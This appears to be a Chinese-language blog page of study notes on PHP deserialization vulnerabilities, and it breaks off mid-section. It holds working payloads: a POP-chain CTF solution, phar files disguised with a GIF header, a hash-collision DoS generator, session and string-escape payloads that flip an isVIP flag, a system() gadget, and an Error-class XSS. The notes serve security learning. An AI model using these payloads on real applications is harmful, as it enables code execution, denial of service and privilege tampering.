
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0">
        <title>Hexo</title>
        <meta name="author" content="John Doe">
        <meta name="description" content="">
        <meta name="keywords" content="">
        <link rel="icon" href="">
        <script src="https://cdn.staticfile.org/instant.page/5.1.0/instantpage.min.js" type="module"></script>
        <script src="https://cdn.staticfile.org/font-awesome/6.1.1/js/all.min.js"></script>
        
        <link rel="stylesheet" href="/css/fonts.min.css">
        <link rel="stylesheet" href="/css/particlex.css">
        
        <script src="https://cdn.staticfile.org/vue/3.2.33/vue.global.prod.min.js"></script>
    <meta name="generator" content="Hexo 6.2.0"></head>
    <body>
        <div id="loading" style="height:100vh;width:100vw;position:fixed;display:flex;z-index:200;justify-content:space-between;background:#fff;transition:opacity 0.3s ease-out"><div style="position:fixed;height:100vh;width:100vw;display:flex;justify-content:center;align-items:center"><div id="loadcontent" style="width:50vmin;height:50vmin;padding:50px;border-radius:50%;display:flex;justify-content:center;align-items:center;border:solid 10px #a3ddfb;text-align:center"><div><h2>LOADING...</h2><p style="word-break:keep-all">加载过慢请开启缓存(浏览器默认开启)</p><div><img alt="loading" src="/loading.gif"></div></div></div></div></div>
        <div id="layout">
            <i data-fa-symbol="calendar-solid" class="fa-solid fa-calendar fa-fw"></i>
            <i data-fa-symbol="bookmark-solid" class="fa-solid fa-bookmark fa-fw"></i>
            <i data-fa-symbol="tags-solid" class="fa-solid fa-tags fa-fw"></i>
            <transition name="into">
                <div v-show="show_page" style="display: -not-none">
                    <div id="menu_show">
                         
<nav id="menu">
    <div class="desktop-menu">
        <a href="/">
            <span class="title">Hexo</span>
        </a>
        
        <a href="/">
            <i class="fa-solid fa-house fa-fw"></i>
            <span>&ensp;home</span>
        </a>
        
        <a href="/about">
            <i class="fa-solid fa-id-card fa-fw"></i>
            <span>&ensp;about</span>
        </a>
        
        <a href="/archives">
            <i class="fa-solid fa-box-archive fa-fw"></i>
            <span>&ensp;archives</span>
        </a>
        
        <a href="/categories">
            <i class="fa-solid fa-bookmark fa-fw"></i>
            <span>&ensp;categories</span>
        </a>
        
        <a href="/tags">
            <i class="fa-solid fa-tags fa-fw"></i>
            <span>&ensp;tags</span>
        </a>
        
    </div>
    <div :class="'phone-menu ' + menu_show" id="phone-menu">
        <div class="curtain" @click="menu_show = !menu_show" v-show="menu_show"></div>
        <div :class="'title'" @click="menu_show = !menu_show">
            <i class="fa-solid fa-bars fa-fw"></i>
            <span>&emsp;Hexo</span>
        </div>
        <transition name="slide">
        <div class="items" v-show="menu_show">
            
            <a href="">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-house fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">home</div>
                </div>
            </a>
            
            <a href="about">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-id-card fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">about</div>
                </div>
            </a>
            
            <a href="archives">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-box-archive fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">archives</div>
                </div>
            </a>
            
            <a href="categories">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-bookmark fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">categories</div>
                </div>
            </a>
            
            <a href="tags">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-tags fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">tags</div>
                </div>
            </a>
            
        </div>
        </transition>
    </div>
</nav>
                    </div>
                    <div id="main">
                        
<div class="article">
    <div>
        <h1> </h1>
    </div>
    <div class="info">
        <span class="date">
            <span class="icon">
                <svg class="fa-icon"><use xlink:href="#calendar-solid"></use></svg>
            </span>
            2022/8/24
        </span>
        
        
    </div>
    <div class="content" v-pre>
        <h1 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h1><h2 id="简介："><a href="#简介：" class="headerlink" title="简介："></a>简介：</h2><p>序列化：把对象转换为字节序列的过程，即把对象转换为可以存储或传输的数据的过程。例如将内存中的对象转换为二进制数据流或文件，在网络传输过程中，可以是字节或是XML等格式。</p>
<p>反序列化：把字节序列恢复为对象的过程，即把可以存储或传输的数据转换为对象的过程。例如将二进制数据流或文件加载到内存中还原为对象。</p>
<h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>在身份验证，文件读写，数据传输等功能处，在未对反序列化接口做访问控制，未对序列化数据做加密和签名，加密密钥使用硬编码（如Shiro 1.2.4），使用不安全的反序列化框架库（如Fastjson 1.2.24）或函数的情况下，由于序列化数据可被用户控制，攻击者可以精心构造恶意的序列化数据（执行特定代码或命令的数据）传递给应用程序，在应用程序反序列化对象时执行攻击者构造的恶意代码，达到攻击者的目的。</p>
<h2 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h2><p>1.解析认证token、session的位置</p>
<p>2.将序列化的对象存储到磁盘文件或存入数据库后反序列化时的位置，如读取json文件，xml文件等</p>
<p>3.将对象序列化后在网络中传输，如传输json数据，xml数据等</p>
<p>4.参数传递给程序</p>
<p>5.使用RMI协议，被广泛使用的RMI协议完全基于序列化</p>
<p>6.使用了不安全的框架或基础类库，如JMX 、Fastjson和Jackson等</p>
<p>7.定义协议用来接收与发送原始的java对象</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="php"><a href="#php" class="headerlink" title="php"></a>php</h3><h4 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h4><p><strong>函数</strong>：</p>
<p><strong>serialize()</strong>:序列化函数</p>
<p>注意：不同类型的对象序列化格式不同</p>
<p>​	private属性：%00A%00name</p>
<p>​	protected属性：%00*%00属性名</p>
<p>​	如果序列化的对象含上述类型，记得传入参数时使用url编码</p>
<p>**unserialize()**：反序列化函数</p>
<p><strong>序列化字符含义</strong>：</p>
<p>a - array                  b - boolean<br>d - double                 i - integer<br>o - common object          r - reference<br>s - string                 C - custom object<br>O - class                  N - null<br>R - pointer reference      U - unicode string</p>
<p><strong>魔术方法</strong>：</p>
<img src="八，反序列化漏洞.assets/image-20211006145311985.png" alt="image-20211006145311985" style="zoom:200%;" />

<p>当PHP5&lt;5.6.25、PHP7&lt;7.0.1时，当成员属性数目大于实际数码时可绕过__wakeup方法（CVE-2016-7124）</p>
<p><strong>PHP反序列化特性</strong></p>
<p>PHP在反序列化时，底层代码时以<code>;</code>作为字段的分隔，以<code>&#125;</code>作为结尾（字符串除外），并且是根据长度判断内容的。</p>
<p> 在反序列的时候php会根据s所指定的字符长度去读取后面的字符。如果指定的长度错误则反序列化就会失败。</p>
<p> 对类中不存在的属性也会进行反序列化。</p>
<h4 id="漏洞判断"><a href="#漏洞判断" class="headerlink" title="漏洞判断"></a>漏洞判断</h4><p>反序列化漏洞的成因在于代码中的 unserialize() 接收的参数可控。因为PHP允许对象序列化，攻击者就可以提交特定的序列化的字符串给一个具有该漏洞的<code>unserialize</code>函数，最终导致一个在该应用范围内的任意PHP对象注入</p>
<p><strong>反序列化的常见起点</strong></p>
<p>__wakeup 一定会调用</p>
<p>__destruct 一定会调用</p>
<p>__toString 当一个对象被反序列化后又被当做字符串使用</p>
<p><strong>反序列化的常见中间跳板</strong>:</p>
<p>__toString 当一个对象被当做字符串使用</p>
<p>__get 读取不可访问或不存在属性时被调用<br>__set 当给不可访问或不存在属性赋值时被调用</p>
<p>__isset 对不可访问或不存在的属性调用isset()或empty()时被调用。形如 $this-&gt;$func();</p>
<p><strong>反序列化的常见终点</strong>:</p>
<p>__call 调用不可访问或不存在的方法时被调用<br>call_user_func 一般php代码执行都会选择这里<br>call_user_func_array 一般php代码执行都会选择这里</p>
<h4 id="pop链"><a href="#pop链" class="headerlink" title="pop链"></a>pop链</h4><p>经典的php反序列化考点</p>
<p>形式是提供多个自定义php类，其中有多种魔术方法，要求根据条件构造php对象并序列化后作为输入</p>
<p>面向属性编程（Property-Oriented Programing） 用于上层语言构造特定调用链的方法，与二进制利用中的面向返回编程（Return-Oriented Programing）的原理相似，都是从现有运行环境中寻找一系列的代码或者指令调用，然后根据需求构成一组连续的调用链。在控制代码或者程序的执行流程后就能够使用这一组调用链来执行一些操作。</p>
<p>ROP 链构造中是寻找当前系统环境中或者内存环境里已经存在的、具有固定地址且带有返回操作的指令集<br>POP 链的构造则是寻找程序当前环境中已经定义了或者能够动态加载的对象中的属性（函数方法），将一些可能的调用组合在一起形成一个完整的、具有目的性的操作。<br>二进制中通常是由于内存溢出控制了指令执行流程，而反序列化过程就是控制代码执行流程的方法之一，前提：&#96;进行反序列化的数据能够被用户输入所控制。</p>
<h5 id="例题："><a href="#例题：" class="headerlink" title="例题："></a>例题：</h5><pre><code>&lt;?php  
@error_reporting(1); 
include &#39;flag.php&#39;;
class baby 
&#123;   
    protected $skyobj;  
    public $aaa;
    public $bbb;
    function __construct() 
    &#123;      
        $this-&gt;skyobj = new sec;
    &#125;  
    function __toString()      
    &#123;          
        if (isset($this-&gt;skyobj))  
            return $this-&gt;skyobj-&gt;read();      
    &#125;  
&#125;  

class cool 
&#123;    
    public $filename;     
    public $nice;
    public $amzing; 
    function read()      
    &#123;   
        $this-&gt;nice = unserialize($this-&gt;amzing);
        $this-&gt;nice-&gt;aaa = $sth;
        if($this-&gt;nice-&gt;aaa === $this-&gt;nice-&gt;bbb)
        &#123;
            $file = &quot;./&#123;$this-&gt;filename&#125;&quot;;        
            if (file_get_contents($file))         
            &#123;              
                return file_get_contents($file); 
            &#125;  
            else 
            &#123; 
                return &quot;you must be joking!&quot;; 
            &#125;    
        &#125;
    &#125;  
&#125;  

class sec 
&#123;  
    function read()     
    &#123;          
        return &quot;it&#39;s so sec~~&quot;;      
    &#125;  
&#125;  

if (isset($_GET[&#39;data&#39;]))  
&#123; 
    $Input_data = unserialize($_GET[&#39;data&#39;]);
    echo $Input_data; 
&#125; 
else 
&#123; 
    highlight_file(&quot;./index.php&quot;); 
&#125; 
?&gt;

</code></pre>
<p>payload</p>
<pre><code>&lt;?php
class baby 
&#123;   
    protected $skyobj;  
    public $aaa;
    public $bbb;
    function __construct() 
    &#123;      
        $this-&gt;skyobj = new cool;//更改为cool类
    &#125;  
    function __toString()      
    &#123;          
        if (isset($this-&gt;skyobj))  
            return $this-&gt;skyobj-&gt;read();      
    &#125;  
&#125;  

class cool 
&#123;    
    public $filename=&#39;./flag.php&#39;;     
    public $nice;
    public $amzing=&#39;O%3A4%3A%22baby%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00skyobj%22%3BO%3A4%3A%22cool%22%3A3%3A%7Bs%3A8%3A%22filename%22%3Bs%3A8%3A%22flag.php%22%3Bs%3A4%3A%22nice%22%3BN%3Bs%3A6%3A%22amzing%22%3BN%3B%7Ds%3A3%3A%22aaa%22%3BN%3Bs%3A3%3A%22bbb%22%3BN%3B%7D
&#39;; 
    function read()      
    &#123;   
        $this-&gt;nice = unserialize($this-&gt;amzing);
        $this-&gt;nice-&gt;aaa = $sth;
    &#125;  
&#125;  

$a = new baby();
$a-&gt;bbb =&amp;$a-&gt;aaa; 
echo urlencode(serialize($a));
</code></pre>
<p>使用指针绕过未知参数$sth,保证aaa与bbb相同</p>
<h4 id="phar"><a href="#phar" class="headerlink" title="phar"></a>phar</h4><p>phar是PHP中类似jar的一种打包文件，对于PHP5.3及更高版本默认支持该后缀文件，如果是想写入phar文件需将php.ini文件中的phar.readonly参数设为0</p>
<h5 id="phar文件结构"><a href="#phar文件结构" class="headerlink" title="phar文件结构"></a>phar文件结构</h5><h6 id="stub"><a href="#stub" class="headerlink" title="stub"></a>stub</h6><p>可以理解为一个标志，格式为<code>xxx&lt;?php xxx; __HALT_COMPILER();?&gt;</code>，前面内容不限，但必须以<code>__HALT_COMPILER();?&gt;</code>来结尾，否则phar扩展将无法识别这个文件为phar文件。</p>
<h6 id="a-manifest-describing-the-contents"><a href="#a-manifest-describing-the-contents" class="headerlink" title="a manifest describing the contents"></a>a <strong>manifest</strong> describing the contents</h6><p>phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以<strong>序列化</strong>的形式存储用户自定义的meta-data，这是上述攻击手法最核心的地方</p>
<h6 id="the-file-contents"><a href="#the-file-contents" class="headerlink" title="the file contents"></a>the file <strong>contents</strong></h6><p>被压缩文件的内容</p>
<h6 id="optional-a-signature-for-verifying-Phar-integrity-phar-file-format-only"><a href="#optional-a-signature-for-verifying-Phar-integrity-phar-file-format-only" class="headerlink" title="[optional] a signature for verifying Phar integrity (phar file format only)"></a>[optional] a <strong>signature</strong> for verifying Phar integrity (phar file format only)</h6><p>签名，放在文件末尾</p>
<h5 id="生成phar包"><a href="#生成phar包" class="headerlink" title="生成phar包"></a>生成phar包</h5><pre><code>&lt;?php
class TestObject &#123;
&#125;//自定义构造

$phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为 phar
$phar-&gt;startBuffering();
$phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置 stub，可添加文件头绕过部分文件类型检测

$o = new TestObject();//自定义构造
$o -&gt; data=&#39;cck&#39;;//自定义构造

$phar-&gt;setMetadata($o); //将自定义的 meta-data 存入 manifest
$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件
//签名自动计算
$phar-&gt;stopBuffering();
?&gt;
</code></pre>
<h5 id="利用phar实现反序列化漏洞"><a href="#利用phar实现反序列化漏洞" class="headerlink" title="利用phar实现反序列化漏洞"></a>利用phar实现反序列化漏洞</h5><p>参数可控的情况下，配合phar:&#x2F;&#x2F;伪协议，可以不依赖<code>unserialize()</code>直接进行反序列化操作。</p>
<p>php一大部分的文件系统函数在通过<code>phar://</code>伪协议解析phar文件时，都会将<code>meta-data</code>进行反序列化</p>
<h6 id="受影响的函数"><a href="#受影响的函数" class="headerlink" title="受影响的函数"></a>受影响的函数</h6><p><img src="/%E5%85%AB%EF%BC%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.assets/image-20220329165920646.png" alt="image-20220329165920646"></p>
<p>都是文件函数</p>
<p>都调用了<code>php_stream_locate_url_wrapper</code> 。这个函数的作用是通过url来找到对应的wrapper。我们可以看到，phar组件注册了<code>phar://</code>这个wrapper</p>
<p>通过源码查找php_stream_open_wrapper，可知下列函数也会引发phar反序列化漏洞</p>
<p>操作文件的<code>touch</code></p>
<pre><code>### exif

- `exif_thumbnail`
- `exif_imagetype`

### gd

- `imageloadfont`
- `imagecreatefrom***`

### hash

- `hash_hmac_file`
- `hash_file`
- `hash_update_file`
- `md5_file`
- `sha1_file`

### file / url

- `get_meta_tags`
- `get_headers`

### standard

- `getimagesize`
- `getimagesizefromstring`
### zip/Bzip / Gzip
    $zip = new ZipArchive();
    $res = $zip-&gt;open(&#39;c.zip&#39;);
    $zip-&gt;extractTo(&#39;phar://test.phar/test&#39;);
    如果题目限制了，phar://不能出现在头几个字符
    $z =&#39;compress.bzip2://phar:///home/sx/test.phar/test.txt&#39;;
当然，它同样适用于compress.zlib://
</code></pre>
<p>数据库？？！</p>
<p><strong>Postgres</strong></p>
<pre><code>&lt;?php
$pdo = new PDO(sprintf(&quot;pgsql:host=%s;dbname=%s;user=%s;password=%s&quot;, &quot;127.0.0.1&quot;, &quot;postgres&quot;, &quot;sx&quot;, &quot;123456&quot;));
@$pdo-&gt;pgsqlCopyFromFile(&#39;aa&#39;, &#39;phar://test.phar/aa&#39;);
</code></pre>
<p>当然，<code>pgsqlCopyToFile</code>和<code>pg_trace</code>同样也是能使用的，只是它们需要开启phar的写功能。</p>
<p><strong>MySQL</strong></p>
<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/998/">https://paper.seebug.org/998/</a></p>
<p>LOAD DATA LOCAL INFILE也会触发这个php_stream_open_wrapper</p>
<pre><code>&lt;?php
class A &#123;
    public $s = &#39;&#39;;
    public function __wakeup () &#123;
        system($this-&gt;s);
    &#125;
&#125;
$m = mysqli_init();
mysqli_options($m, MYSQLI_OPT_LOCAL_INFILE, true);
$s = mysqli_real_connect($m, &#39;localhost&#39;, &#39;root&#39;, &#39;123456&#39;, &#39;easyweb&#39;, 3306);
$p = mysqli_query($m, &#39;LOAD DATA LOCAL INFILE \&#39;phar://test.phar/test\&#39; INTO TABLE a  LINES TERMINATED BY \&#39;\r\n\&#39;  IGNORE 1 LINES;&#39;);
</code></pre>
<p>mysqld的配置</p>
<pre><code>[mysqld]
local-infile=1
secure_file_priv=&quot;&quot;
</code></pre>
<h6 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h6><p>1.Phar文件要能上传到服务器端，如file_exists()，fopen()，file_get_contents()，file()等文件操作的函数。<br>2.文件操作函数的参数可控，且phar:&#x2F;&#x2F;的三种特殊字符没有被过滤。<br>3.要有可用的魔术方法作为跳板，如eval($this -&gt; output)。</p>
<h6 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h6><h5 id="将phar伪造成其它文件"><a href="#将phar伪造成其它文件" class="headerlink" title="将phar伪造成其它文件"></a>将phar伪造成其它文件</h5><p>phar识别只靠<code>xxx&lt;?php xxx; __HALT_COMPILER();?&gt;</code>代码，对前面的内容或者后缀名是没有要求的。那么我们就可以通过添加任意的文件头+修改后缀名的方式将phar文件伪装成其他格式的文件</p>
<h6 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h6><ol>
<li>在文件系统函数的参数可控时，对参数进行严格的过滤。</li>
<li>严格检查上传文件的内容，而不是只检查文件头。</li>
<li>在条件允许的情况下禁用可执行系统命令、代码的危险函数。</li>
</ol>
<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/680/">https://paper.seebug.org/680/</a></p>
<h5 id="利用phar实现PHP内核哈希表碰撞攻"><a href="#利用phar实现PHP内核哈希表碰撞攻" class="headerlink" title="利用phar实现PHP内核哈希表碰撞攻"></a>利用phar实现PHP内核哈希表碰撞攻</h5><p>相比于上一种利用方式，这种不需要苛刻的有可用的魔术方法的条件只需可控参数的文件操作函数的条件即可。<br>在PHP内核中，数组是以哈希表的方式实现的，攻击者可以通过巧妙的构造数组元素的key使哈希表退化成单链表（时间复杂度从O(1) &#x3D;&gt; O(n)）来触发拒绝服务攻击。</p>
<p>生成恶意DoS phar文件。</p>
<pre><code class="php">&lt;?php
    $size= pow(2, 16);
    $array = array();
    for ($key = 0, $maxKey = ($size - 1) * $size; $key &lt;= $maxKey; $key += $size) &#123;
        $array[$key] = 0;
    &#125;
    $obj = new stdClass;
    $obj-&gt;dos = $array;

    $phar = new Phar(&quot;dos.phar&quot;);
    $phar-&gt;startBuffering();
    $phar-&gt;setStub(&#39;&lt;?php __HALT_COMPILER();?&gt;&#39;);
    $phar-&gt;setMetadata($obj);
    $phar-&gt;addFromString(&quot;dos.txt&quot;, &quot;dos&quot;);
    $phar-&gt;stopBuffering();

?&gt;
</code></pre>
<p>PHP修复此漏洞的方式是限制通过$_GET或$_POST等方式传入的参数数量，但是如果PHP脚本通过json_decode()或unserialize()等方式获取参数，依然将受到此漏洞的威胁。</p>
<h4 id="session反序列化"><a href="#session反序列化" class="headerlink" title="session反序列化"></a>session反序列化</h4><h5 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h5><p>（1）session概念</p>
<p>PHP session时一个特殊的变量，用于存储有关用户会话的信息，或更改用户会话的设置。session变量保存的信息是单一用户的，并且可供应用程序中的所有界面使用。它每个访问或者创建都有唯一的id（UID），并基于这个UID来储存变量。UID储存在cookie中，或者通过URL来进行传导。</p>
<p>（2）会话过程</p>
<p>当开始一个会话时，PHP会尝试从请求中查找会话ID（通常通过会话cookie），如果请求中不包括会话ID信息，PHP就会创建一个新的会话。会话开始之后，PHP就会将会话中的数据设置到<code>$_SESSION</code>变量中。当PHP停止的时候，它会自动读取<code>$_SESSION</code>中的内容，并将其进行序列化，然后发送会话保存管理器来进行保存。</p>
<p> 默认情况下，PHP使用内置的文件会话保存管理器（files）来完成会话的保存。可以通过调用函数<code>session_start()</code>来手动开始一个会话。如果配置项<code>session.auto_start</code>设置为1，那么请求开始的时候，会话会自动开始</p>
<p>PHP脚本执行完毕之后，会话会自动关闭。同时，也可以通过调用函数<code>session_write_close()</code>来手动关闭会话</p>
<p>（3）存储引擎</p>
<p>PHP中的session中的内容默认是以文件的方式储存，储存方式是由配置项<code>session.save_handler</code>来进行确定的，默认是以文件的方式储存。储存的文件是以<code>sess_PHPSESSID</code>来进行命名的，文件的内容就是session值得序列化之后得内容。</p>
<p><code>session.serialize_handler</code>有如下三种取值：</p>
<p><img src="/%E5%85%AB%EF%BC%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.assets/image-20220330143941490.png" alt="image-20220330143941490"></p>
<h5 id="session反序列化漏洞"><a href="#session反序列化漏洞" class="headerlink" title="session反序列化漏洞"></a>session反序列化漏洞</h5><p>当网站序列化存储session与反序列化读取session方式不同时，就可能导致session反序列化漏洞的产生。一般都是以<code>php_serialize</code>序列化存储session，以PHP反序列化读取session，造成反序列化攻击</p>
<p>eg：</p>
<p><img src="/%E5%85%AB%EF%BC%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.assets/image-20220330144229162.png" alt="image-20220330144229162"></p>
<p><code>unserialize</code>的特性，在执行<code>unserialize</code>的时候，如果字符串前面满足了可被序列化的规则，则后学的字符就会被忽略</p>
<p>exp：</p>
<pre><code>&lt;?php
class session&#123;
  var $var=&quot;system(&#39;calc&#39;);&quot;;
&#125;
echo &quot;|&quot;.serialize(new session());
</code></pre>
<p>在s1.php传入即可</p>
<p>上文可以给<code>$_SESSION</code>赋值，若代码中不存在给<code>$_SESSION</code>赋值可以利用<code>uplode_process</code>机制，可以在<code>$_SESSION</code>中创建一个键值对，其中的值可以控制</p>
<pre><code>&lt;?php
$key=ini_get(&quot;session.upload_progress.prefix&quot;) . ini_get(&quot;session.upload_progress.name&quot;);
var_dump($_SESSION[$key]);
?&gt;
</code></pre>
<h4 id="反序列化字符逃逸"><a href="#反序列化字符逃逸" class="headerlink" title="反序列化字符逃逸"></a>反序列化字符逃逸</h4><p>当开发者使用先将对象序列化，然后将对象中的字符进行过滤，最后再进行反序列化。这个时候就有可能会产生PHP反序列化字符逃逸的漏洞。</p>
<h5 id="过滤后字符变多"><a href="#过滤后字符变多" class="headerlink" title="过滤后字符变多"></a>过滤后字符变多</h5><p>eg：</p>
<p>源码</p>
<pre><code class="php">&lt;?php
class user&#123;
    public $username;
    public $password;
    public $isVIP;
    
    public function __construct($u,$p)&#123;
        $this-&gt;username = $u;
        $this-&gt;password = $p;
        $this-&gt;isVIP = 0;
    &#125;
&#125;

function filter($s)&#123;
    return str_replace(&quot;admin&quot;,&quot;hacker&quot;,$s);
&#125;

$a = new user(&quot;admin&quot;,&quot;123456&quot;);
$a_seri = serialize($a);
$a_seri_filter = filter($a_seri);

echo $a_seri_filter;
?&gt;
</code></pre>
<p>序列化后的结果将admin替换为hacker</p>
<pre><code>O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:0;&#125;  //未过滤
O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:5:&quot;hacker&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:0;&#125; //已过滤
</code></pre>
<p>过滤后字符串长度+1，而前面的长度标志仍是5，这样最后一个字符就逃逸了</p>
<p>下一步就是想办法将默认的isVIP的值换为1</p>
<p>对比目标字符串和现有字符串：</p>
<pre><code>&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:0;&#125;	//现有子串
&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;	//目标子串
</code></pre>
<p>长度一样均为47。如果我们想办法将目标字符串作为我们输入的结尾再让现有的字符串逃逸掉，这样最终得到的就是我们需要的。</p>
<p>输入：</p>
<p>重复47次admin，那么过滤成hacker后就会逃逸掉47个字符</p>
<pre><code>adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;
</code></pre>
<p>最终：</p>
<pre><code>O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:282:&quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;
</code></pre>
<h5 id="过滤后字符变少"><a href="#过滤后字符变少" class="headerlink" title="过滤后字符变少"></a>过滤后字符变少</h5><p>思路与上面一样</p>
<p>源码：</p>
<pre><code class="php">&lt;?php
class user&#123;
    public $username;
    public $password;
    public $isVIP;
    
    public function __construct($u,$p)&#123;
        $this-&gt;username = $u;
        $this-&gt;password = $p;
        $this-&gt;isVIP = 0;
    &#125;
&#125;

function filter($s)&#123;
    return str_replace(&quot;admin&quot;,&quot;hack&quot;,$s);
&#125;

$a = new user(&#39;admin&#39;,&#39;123456&#39;);
$a_seri = serialize($a);
$a_seri_filter = filter($a_seri);

echo $a_seri_filter;
?&gt;
</code></pre>
<p>可控变量：</p>
<p>username，password</p>
<p>PHP反序列化的机制是，比如如果前面是规定了有10个字符，但是只读到了9个就到了双引号，这个时候PHP会把双引号当做第10个字符，也就是说不根据双引号判断一个字符串是否已经结束，而是根据前面规定的数量来读取字符串。</p>
<p>因为过滤的时候，将<strong>5</strong>个字符删减为了<strong>4</strong>个，所以和上面字符变多的情况相反，随着加入的<strong>admin</strong>的数量增多，<strong>现有子串</strong>后面会缩进来。</p>
<p>计算一下<strong>目标子串</strong>的长度：</p>
<pre><code>&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;	//目标子串
//长度为47
</code></pre>
<p>再计算一下到<strong>下一个可控变量</strong>的字符串长度：</p>
<pre><code>&quot;;s:8:&quot;password&quot;;s:6:&quot;
//长度为22
</code></pre>
<p>payload</p>
<pre><code>adminadmnadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&#39;,&#39;&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;
</code></pre>
<p>结果：</p>
<pre><code>O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:115:&quot;hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack&quot;;s:8:&quot;password&quot;;s:47:&quot;&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;&quot;;s:5:&quot;isVIP&quot;;i:0;&#125;
</code></pre>
<p>即第一个可控变量将到下一个可控变量前的字符吞掉，第二个可控变量修改结尾，原来的结尾由于大于长度被逃逸掉</p>
<h4 id="原生类利用"><a href="#原生类利用" class="headerlink" title="原生类利用"></a>原生类利用</h4><p>有反序列化但原本的代码中找不到pop链的时候，通过原生类构造反序列化漏洞</p>
<h5 id="Error-x2F-Exception-内置类"><a href="#Error-x2F-Exception-内置类" class="headerlink" title="Error&#x2F;Exception 内置类"></a>Error&#x2F;Exception 内置类</h5><h6 id="利用条件："><a href="#利用条件：" class="headerlink" title="利用条件："></a>利用条件：</h6><p>error：</p>
<ul>
<li>适用于php7版本</li>
<li>在开启报错的情况下</li>
</ul>
<p>exception：</p>
<ul>
<li>适用于php5、7版本</li>
<li>开启报错的情况下</li>
</ul>
<h6 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h6><p>Error类是php的一个内置类，用于自动自定义一个Error，在php7的环境下可能会造成一个xss漏洞，因为它内置有一个 <code>__toString()</code> 的方法，常用于PHP 反序列化中。当 PHP 对象被当作一个字符串输出或使用时候（如<code>echo</code>的时候）会触发<code>__toString</code> 方法</p>
<p>eg;</p>
<pre><code>&lt;?php
$a = unserialize($_GET[&#39;whoami&#39;]);
echo $a;
?&gt;
</code></pre>
<p>exp:</p>
<pre><code>&lt;?php
$a = new Error(&quot;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&quot;);
$b = serialize($a);
echo urlencode($b);  
?&gt;
</code></pre>
<h6 id="绕过哈希比较"><a href="#绕过哈希比较" class="headerlink" title="绕过哈希比较"></a>绕过哈希比较</h6><p>eg：</p>
<pre><code>&lt;?php
$a = new Error(&quot;payload&quot;,1);$b = new Error(&quot;payload&quot;,2);
echo $a;
echo &quot;\r\n\r\n&quot;;
echo $b;
</code></pre>
<p>输出如下：</p>
